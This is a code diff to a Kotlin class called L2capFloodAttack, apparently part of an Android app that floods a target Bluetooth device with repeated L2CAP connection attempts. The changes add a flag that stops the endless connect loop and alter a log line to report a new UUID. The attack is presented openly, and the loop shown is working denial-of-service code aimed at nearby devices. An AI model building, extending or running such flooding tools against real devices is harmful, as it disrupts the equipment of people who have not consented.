@@ -21,6 +21,7 @@ class L2capFloodAttack(private val targetAddress: String) {
     private var bluetoothAdapter: BluetoothAdapter? = null
     private var l2capSocket: BluetoothSocket? = null
     private var coroutineScope: CoroutineScope? = null
+    private var needBrake = false
 
     // Purge oldest messages if the line count exceeds 100
     private fun purgeOldestMessagesIfNeeded(element: TextView) {
@@ -46,6 +47,7 @@ class L2capFloodAttack(private val targetAddress: String) {
                 val baseUUID = UUID.fromString("00001105-0000-1000-8000-00805F9B34FB")
 
                 while (true) {
+                    if (needBrake) break
                     val uuid = successfulUUID ?: baseUUID
                     try {
                         // Create socket and connect
@@ -62,7 +64,7 @@ class L2capFloodAttack(private val targetAddress: String) {
                             (context as AttackActivity).runOnUiThread {
                                 if (AttackActivity.isAttacking) {
                                     purgeOldestMessagesIfNeeded(element)
-                                    Logger.appendLog(element, "Failed to connect..")
+                                    Logger.appendLog(element, "Failed to connect.. \nCreating new UUID = $successfulUUID")
                                 } else {
                                     cancel()
                                 }
@@ -112,6 +114,7 @@ class L2capFloodAttack(private val targetAddress: String) {
 
     @SuppressLint("MissingPermission")
     fun stopAttack() {
+        needBrake = true
         AttackActivity.isAttacking = false
         coroutineScope?.cancel() // Cancel the coroutine, stopping the attack
         coroutineScope = null
